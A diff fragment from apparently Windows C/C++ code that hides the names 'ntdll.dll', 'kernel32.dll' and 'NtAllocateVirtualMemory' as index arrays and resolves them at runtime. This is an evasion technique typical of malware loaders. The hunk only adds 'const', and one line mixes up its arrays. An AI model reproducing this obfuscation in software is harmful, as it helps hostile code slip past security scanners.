@@ -160,11 +160,11 @@ int main(int argc, char* argv[]) {
     //Get a handle to the ntdll.dll library
     //hello
     int ntt[] = { 13, 19, 3, 11, 11, 62, 3, 11, 11 };
-    wchar_t* ntd = getoriginal(ntt, big_string, sizeof(ntt));
+    const wchar_t* ntd = getoriginal(ntt, big_string, sizeof(ntt));
     HMODULE hNtdll = GetModuleHandleA(getoriginal(ntt, big_string, sizeof(ntt)));
     
     int ws_lld_ker_32[] = {10, 4, 17, 13, 4, 11, 55, 54, 62, 3, 11, 11};
-    wchar_t* ker32 = getoriginal(ntt, big_string, sizeof(ws_lld_ker_32));
+    const wchar_t* ker32 = getoriginal(ntt, big_string, sizeof(ws_lld_ker_32));
     HMODULE istfromKe__ws_ls_32 = GetModuleHandleA(getoriginal(ws_lld_ker_32, big_string, sizeof(ws_lld_ker_32)));
     
     int ntalloc_mem[] = { 39, 19, 26, 11, 11, 14, 2, 0, 19, 4, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24 };
